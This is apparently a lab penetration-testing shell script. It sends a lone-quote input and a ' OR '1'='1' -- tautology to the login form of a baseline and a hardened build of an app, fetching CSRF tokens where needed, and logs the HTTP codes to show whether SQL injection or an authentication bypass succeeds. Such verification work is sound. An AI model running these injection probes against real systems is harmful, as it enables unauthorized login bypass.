#!/bin/sh
# Direct proof that the login username field is SQL-injectable on the BASELINE and safe on the
# HARDENED build, where sqlmap is unreliable here (baseline: 302/401/200 confuse its oracle so it
# falls back to an impractical time-based dump; hardened: every probe is a 400 CSRF reject, so its
# "not injectable" is inconclusive). Lab use only.
# Usage: sh login_injection_proof.sh <host-ip>
H=${1:-192.168.56.1}
B=http://$H:5444; S=https://$H:5443
E=$HOME/vapt-evidence; mkdir -p "$E"; OUT=$E/login_injection_proof.txt; : > "$OUT"
WRONG=definitely_wrong_pw

# A parameterised login treats these as an ordinary (wrong) username -> 401. An unsafe concatenated
# query 500s on the lone quote (the quote breaks the SQL) and a tautology may even return 302 (bypass).
say() { echo "$1" | tee -a "$OUT"; }

say "=== BASELINE (http, no CSRF) ==="
for pair in "arjun:control, real user + wrong password" "':lone single quote" "' OR '1'='1' -- :tautology bypass"; do
  u=${pair%%:*}; label=${pair#*:}
  c=$(curl -s -o /dev/null -w '%{http_code}' --data-urlencode "username=$u" --data-urlencode "password=$WRONG" "$B/login")
  say "  [$label] username=<$u> -> HTTP $c"
done

say "=== HARDENED (https, per-request CSRF token) ==="
for pair in "arjun:control, real user + wrong password" "':lone single quote" "' OR '1'='1' -- :tautology bypass"; do
  u=${pair%%:*}; label=${pair#*:}
  rm -f "$E/jarL"
  tok=$(curl -sk -c "$E/jarL" "$S/login" | sed -n 's/.*name="csrf_token"[^>]*value="\([^"]*\)".*/\1/p' | head -1)
  c=$(curl -sk -b "$E/jarL" -o /dev/null -w '%{http_code}' \
    --data-urlencode "csrf_token=$tok" --data-urlencode "username=$u" --data-urlencode "password=$WRONG" "$S/login")
  say "  [$label] username=<$u> -> HTTP $c"
done

say "---"
say "Injectable where a lone quote 500s (SQL broke). 401 for every input = parameterised/safe."
say "302 on the tautology = full authentication bypass."
rm -f "$E/jarL"
